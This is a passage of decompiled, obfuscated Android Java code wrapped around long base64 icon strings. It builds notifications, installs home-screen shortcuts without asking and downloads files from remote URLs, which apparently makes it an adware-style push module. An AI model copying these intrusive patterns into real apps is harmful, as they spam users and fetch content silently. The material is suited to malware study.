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"")));           intent.putExtra(""image"",""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9PaO47dBIGZnEs3tKlkEQunrj7upau90KqJ6Ai3hQrbfvBQzlzKXRsbGxDQwbuaSsBWEBkpEWhkziga3L+MybtxTQWidB1YuEhmq12bmXeO99cmXs0qlTpxQxR0drltQEQhmKpMqg4oXjW3HFdTgIXU5Qs36R0FANI+a9T84VJcycuTArdd81BhY2EChDKrqQYBIDZBIRtHTpUg5F6vKNDXa9mgfVMOLDHHfm/YUzMyEzle/2SBm2NXCBjWwNtC5pDYyUMZHoljl7fOua+a9OnTx58qvzl65bT7Ju2fIGKwJVKgI6D2Puk8NazCGxaHzfnLKRQA1DRdbMpSJbR1pZBpVtPb56KsVl8vz1fJatdhoRSLwtzjOYM87MzOPAzIWXxkZhReYyKCwT2XothimDe/HChwqW4UXq1TW8uGa3RWio33IOuDNO4CC8uHP8WmtZayQBpdI5Yxtkc65dGwocTY3iRIYRi7sr0RwiUG92nkGTl5mXnxdKZuaNsX1MJOFi5mzYf2p/TurY6LVAT04My06GFUMBUQyqIHq92X7uzOHCzLzifEge+ktE6/gSlmHRvbLv7KWOD+rqdrx9aXxstOddBTN1zVSGhGKWkmXZ3mBBoBY8Z9u5SuCwl2/Iz8vlyMyO12PmLNnX0tKyYcOOunaUHR1AnkqVzl8XEknFdQeaTJJFWh3Uc7bZM/M2FaPkFxvy0+VMuoHULDx1tqelbC4rVZS3t3dC2tvrPugYv1QQt3ydIFKTl65HF+Mht06ySG+yOtucCzOLiQfJnQaTLc3nxNoNMXCKbM67ze0knReBvNFQsL0kJLLz0dW95phbJVEZrU3OQhGXPx0vHzONTGde7htxsBxHH5xsvyikv73u5LHje0pK1pVwIgKXbW9wAGhtsmfmb+K9/HQpd3UxuQYyj+ZLZ8fGxm909l8UiZfbmzuO79laUoJElgMPNFlVEp3TLqqXPoWi4QLDHacYuKW+MT429uDkxf7wAHkMkcujBPBQo0klMTsL8zeJJo+dUTgbLi8aKqYbyEJbHoyP32gXpM7Oi/3Dw/39w5fbTx7a+Hp0lJRlZGhRSo55jSqJ1VkomjwmVrvJkMtSNCOXU3L+8u548KBZ8IZjWXnsm3Wdw8PDly+3f1Ceo4iJgmsS7uTtbQ4AzfbCfHyxFE+naXkGvmZoRppkyGWY6aRinuVBh1Dw1mZyy0kX1EHPy/3nd1akxsnRD4hlh5oqATQiEK1ncTrNpkO9KTTNzio1GHLltBTf13mlpX3nhX79corcbhQVuxmRF5urc17fiq7rY41Wk1aiddbn4xvEkP8aPSV3OkMzr+UaDJnTGJpmpuGKpUc+Elbk1psMtaBuxwI5JuWYbD95YE/J+vVbG7wYtDfZiomYy9KgyBcZDHnpUpjFGTRcOuBtO9EpFOxkKfb8rVu3hpsXwNpSsZ3DaL1P79lesv5Am9tq0km01ra2bdu2laJlmUXT0qRSPIu0NL40X05PMeTll55oDhVcQNNvDuOr5ladlKLryPfNx0E81Ndot+okKp1zsPfIkSOAbiqU0zNgFqfBLM4ohFmMpeHSKT3iE1ZkuI6h5BdFg+9H4NXL568c33P8Sl+T3QhD1mntfQO9vSdOAKqeLE9PZ+mI2NxiQ950lqYj5DBgKIjvDpBiaXrHZeJ1Smnp+eH+q1dv3rx558r169dv91l1OgCNRm22uSl4Nzhw4sSJFYq46Kg49bZNxWjY8llSNu3IR+gmhst4uP/yZoaO7QcdD56N2IGsO3fu3Zu4ff16l12LLATqtNlKlbUtePdusK+ioGAnTIAlOToqJmXbtqzoVD+6ZIbPL1iwufOinGWbr6LcvNmsiMtB1qefTkxM3L9dq1FmA4UWxQSgVqtSJijNzr7g4Omu4EBvbUFBQbkX4KKcikaocfO8Ijo6WpEcF/32HZJ75QUFfciamBhoMmsSgNPqjCaTERrCVy0is5UJCUpNUXVb3+murq7BYHCgrbri2OA9lO4CkopPcSYmBk+fHpwIwjLo0VnZ8GMfQJMJNTTqdGjUWpUqW5WN0ISENM1ae1NTW8Ox0123J0i6TkO6AIEEAaotWqVXo2OVSEMe9DPqjDoJ0lQqbIJHosQsenMKn530+E1o0SoceOMG73OTEhI4C4I5cr4ODdlkBRiGm60VoUo+CY8J3pFNNOTBiWhZs1UwVKtJYjQDiEaMjoKdOrxEIhNU5eMClpYcjo7N1uJBm02kIZ5CmESlMiODm2Etfio7TMZMtorsRy/M7eQn0QiYxFRpQSIh8bIoYZYSAFaS+SFHI0NFXpbUz0hII7PIHaDV8aDVQiqGOpFaGRlkYRLIRwf+uwRYkQyuK7w+p2lJQQsesoWviEuohLUWDTZDmSGMWRlaDqE/6Qeg1SKxVCLQKJDCsAQ1m/TR6teuXatXcVZoqFhDHHiWStSwCkSO5HsSE53Fl9GZVyXHyGRxyRqt0I2zeM4EIMyhBYEiUacVo6SqSmW0r5CSNxTyLJ3QjHBG7KF+lio85Koq3BGb4p48C/eo1ZkjvGFls3QhzUiC2mGw0iKpdNgEUWxyrE5nNa9aVVTOCm+AKakeDSPEmfBgEVdVZbXCkG1EtAg1CUtck30VvFdlRR5FJaN9Rn7iOA17Nhhylc2GxRApFIW/le7yMAsnzoykMAxziALQwYEcGVLhaHtbg+wRj5IWVVqM3KwJGPEclZIqa73NZhNQUVGLw74iVfGoB+IKq2BZBAxSD3OIG/IRN61074QPI3SYxL5BXoBNtoY14716W5UEvkLCSbT+tsYmfDIthKIUb+2NQ8/A5biiUtzMxoP1NmjocolFDrV5e6u5jyHCZ4c33lkZzW9IzXCYrSoMq3e5HFYMukhLQYXj6nuDBZxHkbdb0SvfWSkTXoJKDm9GPJcDhuz1uHC4Z8khHn9tTgwdgcKwEVREBBWHPPIMCqVwiDEXHxvcKR4Pv0V6wsPbVA5vv9AFzUZEr1wZRdMK5JFncKgYh8tWTwbKcx6XBy4bmwjkUJe3t1ZKRXCnRgGlQF50BCsC4+yuhzAUNGQPH8H0+vtyKFbGhY2CxVi5eLEiQiYKrXCHSnAaxFsPDb0hknzxDQwqqNC5rCx58eLFyazYY+lyfu5DGsRtk/zT4fF5wuMPDqbSUaHIQEyRyUTPRNFxTb4wCcfnddgkf3rZ+xDo9QfvV1Cy6FCiol6LixJv07La3ofO8qE/Ps+/JD/4sxuJvlBPn3/g/m0FxUaFlRR9H0HHVPf5H24H8Ta+/BvJUz9yuH14E78C2uPvvXv/XKos4gmRxeU0BIWCPlEaHU9/UyL5ksvb7QuPf+Du/dsNFU9I9bnBu71+XCKM83V7Xd9Bv4T9rcfdGE76e0F8cu4GwXs0Xrf3b/i3xE+97HD7HxEH4B3yYxMM9j7O6+52OzyTyC+yJ7k83kafmPT7/b1PCux7jOZvhOvyh/yv2p/6iwdKwoHdoKJHNyL9vfgRCt7uhsF08w/uH9jX6HD9fZLofwMm/fzfXrvb3+hGM+FzN/oaG/3w8MLLuL1+N95oRBvwQDt9/JF4p9vu9Tz93fD/rvjqL/5jq/fVw30IPywc9T6HAx6eeiva8OINX73V63V4vGS7Hh3Gb7hsnt99i4P+B2xTkRmbbLQ/AAAAAElFTkSuQmCC"");           throw th;         }  catch (        IOException e5) {           throw e5;         }       }       PendingIntent broadcast=PendingIntent.getBroadcast(context,intExtra,intent,134217728);       Notification notification=new Notification(intExtra2,stringExtra2,System.currentTimeMillis());       notification.setLatestEventInfo(context,stringExtra,stringExtra2,broadcast);       try {         Class<?> cls=Class.forName(""com.android.internal.R$id"");         int i=cls.getField(""title"").getInt(cls);         int i2=cls.getField(""text"").getInt(cls);         notification.contentView.setImageViewBitmap(cls.getField(""icon"").getInt(cls),bitmap);         notification.contentView.setTextViewText(i,stringExtra);         notification.contentView.setTextViewText(i2,stringExtra2);         notification.contentIntent=broadcast;         notification.defaults|=4;         notification.flags|=1;         notification.ledARGB=-65536;         notification.ledOffMS=300;         notification.ledOnMS=300;         notificationManager.notify(intExtra,notification);       }  catch (      Exception e6) {         throw e6;       }     }   }   public static void a(  Context context,  Bitmap bitmap,  String str,  int i){     if (!c(context,""com.android.launcher.permission.INSTALL_SHORTCUT"")) {       Log.i(""box"",""Installing shortcut permission not found in manifest, please add."");       return;     }     if (bitmap == null) {       try {         bitmap=k(context,""folderbg.png"");       }  catch (      Exception e2) {         Log.i(""box"",""icon error2!!"");       }     }     if (bitmap != null) {       Intent intent=new Intent(""com.android.launcher.action.INSTALL_SHORTCUT"");       intent.putExtra(""android.intent.extra.shortcut.ICON"",bitmap);       intent.putExtra(""android.intent.extra.shortcut.NAME"",str);       intent.putExtra(""duplicate"",false);       try {         Intent intent2=new Intent(context,(Class<?>)knvu.d(context));         intent2.addFlags(268435456);         intent2.addFlags(134217728);         intent2.setAction(""Showbox"");         intent2.putExtra(""title"",str);         intent2.putExtra(""shoutcut"",true);         intent2.putExtra(""localfile"",true);         intent2.putExtra(""boxtype"",i);         intent.putExtra(""android.intent.extra.shortcut.INTENT"",intent2);         context.sendBroadcast(intent);       }  catch (      Exception e3) {         e3.printStackTrace();       }     }   }   public static void a(  Context context,  String str,  File file){     BufferedOutputStream bufferedOutputStream;     BufferedInputStream bufferedInputStream=null;     HttpGet httpGet=new HttpGet(str);     try {       try {         BasicHttpParams basicHttpParams=new BasicHttpParams();         HttpConnectionParams.setConnectionTimeout(basicHttpParams,20000);         HttpConnectionParams.setSoTimeout(basicHttpParams,20000);         HttpConnectionParams.setSocketBufferSize(basicHttpParams,8192);         HttpClientParams.setRedirecting(basicHttpParams,true);         HttpProtocolParams.setUserAgent(basicHttpParams,null);         if (j(context)) {           basicHttpParams.setParameter(""http.route.default-proxy"",new HttpHost(""10.0.0.172"",80));         }         HttpResponse execute=new DefaultHttpClient(basicHttpParams).execute(httpGet);         if (execute.getStatusLine().getStatusCode() == 200) {           try {             BufferedInputStream bufferedInputStream2=new BufferedInputStream(execute.getEntity().getContent(),8192);             try {               bufferedOutputStream=new BufferedOutputStream(new FileOutputStream(file),8192);               try {                 byte[] bArr=new byte[8192];                 while (true) {                   int read=bufferedInputStream2.read(bArr);                   if (read <= 0) {                     break;                   }  else {                     bufferedOutputStream.write(bArr,0,read);                   }                 }                 bufferedInputStream2.close();                 bufferedOutputStream.close();               }  catch (              Throwable th) {                 th=th;                 bufferedInputStream=bufferedInputStream2;                 if (bufferedInputStream != null) {                   bufferedInputStream.close();                 }                 if (bufferedOutputStream != null) {                   bufferedOutputStream.close();                 }                 throw th;               }             }  catch (            Throwable th2) {               th=th2;               bufferedOutputStream=null;               bufferedInputStream=bufferedInputStream2;             }           }  catch (          Throwable th3) {             th=th3;             bufferedOutputStream=null;           }         }       }   finally {         httpGet.abort();       }     }  catch (    Exception e2) {       throw e2;     }   }   public static void a(  Context context,  d dVar){     Bitmap bitmap;     try {       k(context);       b=dVar.h().hashCode();       try {         Bitmap a2=new l(context).a(context,dVar.m());         if (a2 == null) {           try {             bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(q.a(""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9PaO47dBIGZnEs3tKlkEQunrj7upau90KqJ6Ai3hQrbfvBQzlzKXRsbGxDQwbuaSsBWEBkpEWhkziga3L+MybtxTQWidB1YuEhmq12bmXeO99cmXs0qlTpxQxR0drltQEQhmKpMqg4oXjW3HFdTgIXU5Qs36R0FANI+a9T84VJcycuTArdd81BhY2EChDKrqQYBIDZBIRtHTpUg5F6vKNDXa9mgfVMOLDHHfm/YUzMyEzle/2SBm2NXCBjWwNtC5pDYyUMZHoljl7fOua+a9OnTx58qvzl65bT7Ju2fIGKwJVKgI6D2Puk8NazCGxaHzfnLKRQA1DRdbMpSJbR1pZBpVtPb56KsVl8vz1fJatdhoRSLwtzjOYM87MzOPAzIWXxkZhReYyKCwT2XothimDe/HChwqW4UXq1TW8uGa3RWio33IOuDNO4CC8uHP8WmtZayQBpdI5Yxtkc65dGwocTY3iRIYRi7sr0RwiUG92nkGTl5mXnxdKZuaNsX1MJOFi5mzYf2p/TurY6LVAT04My06GFUMBUQyqIHq92X7uzOHCzLzifEge+ktE6/gSlmHRvbLv7KWOD+rqdrx9aXxstOddBTN1zVSGhGKWkmXZ3mBBoBY8Z9u5SuCwl2/Iz8vlyMyO12PmLNnX0tKyYcOOunaUHR1AnkqVzl8XEknFdQeaTJJFWh3Uc7bZM/M2FaPkFxvy0+VMuoHULDx1tqelbC4rVZS3t3dC2tvrPugYv1QQt3ydIFKTl65HF+Mht06ySG+yOtucCzOLiQfJnQaTLc3nxNoNMXCKbM67ze0knReBvNFQsL0kJLLz0dW95phbJVEZrU3OQhGXPx0vHzONTGde7htxsBxHH5xsvyikv73u5LHje0pK1pVwIgKXbW9wAGhtsmfmb+K9/HQpd3UxuQYyj+ZLZ8fGxm909l8UiZfbmzuO79laUoJElgMPNFlVEp3TLqqXPoWi4QLDHacYuKW+MT429uDkxf7wAHkMkcujBPBQo0klMTsL8zeJJo+dUTgbLi8aKqYbyEJbHoyP32gXpM7Oi/3Dw/39w5fbTx7a+Hp0lJRlZGhRSo55jSqJ1VkomjwmVrvJkMtSNCOXU3L+8u548KBZ8IZjWXnsm3Wdw8PDly+3f1Ceo4iJgmsS7uTtbQ4AzfbCfHyxFE+naXkGvmZoRppkyGWY6aRinuVBh1Dw1mZyy0kX1EHPy/3nd1akxsnRD4hlh5oqATQiEK1ncTrNpkO9KTTNzio1GHLltBTf13mlpX3nhX79corcbhQVuxmRF5urc17fiq7rY41Wk1aiddbn4xvEkP8aPSV3OkMzr+UaDJnTGJpmpuGKpUc+Elbk1psMtaBuxwI5JuWYbD95YE/J+vVbG7wYtDfZiomYy9KgyBcZDHnpUpjFGTR